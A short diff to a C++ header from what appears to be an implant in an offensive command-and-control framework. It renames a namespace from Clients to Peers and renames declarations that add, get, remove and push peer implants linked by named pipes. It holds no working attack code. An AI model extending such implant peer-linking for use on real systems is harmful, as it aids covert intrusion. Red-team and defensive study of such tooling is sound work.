@@ -2,21 +2,21 @@
 #define HEXANE_IMPLANT_CLIENTS_HPP
 #include <core/corelib.hpp>
 
-namespace Clients {
+namespace Peers {
     PPEER_DATA
     FUNCTION
-        GetClient(UINT32 peer_id);
+        GetPeer(UINT32 peer_id);
 
     BOOL
     FUNCTION
-        RemoveClient(UINT32 peer_id);
+        RemovePeer(UINT32 peer_id);
 
     BOOL
     FUNCTION
-        AddClient(CONST WCHAR *pipe_name, UINT32 peer_id);
+        AddPeer(CONST WCHAR *pipe_name, UINT32 peer_id);
 
     VOID
     FUNCTION
-        PushClients(VOID);
+        PushPeers();
 }
 #endif //HEXANE_IMPLANT_CLIENTS_HPP
